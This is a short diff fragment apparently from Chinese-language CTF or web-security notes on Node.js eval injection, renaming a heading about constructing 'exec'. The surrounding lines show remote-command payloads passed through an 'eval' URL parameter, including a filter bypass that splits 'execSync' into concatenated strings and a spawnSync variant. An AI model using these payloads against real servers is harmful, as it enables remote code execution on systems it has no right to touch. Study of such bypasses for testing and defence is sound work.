@@ -34,7 +34,7 @@ eval(require("child_process").execSync('ls'))
 ^
 有过滤exec|load
 ```
-评价exec
+构造exec
 ?eval=require("child_process")['exe'%2B'cSync']('ls')
 
 ?eval=require( 'child_process' ).spawnSync( 'ls', [ '.' ] ).stdout.toString()
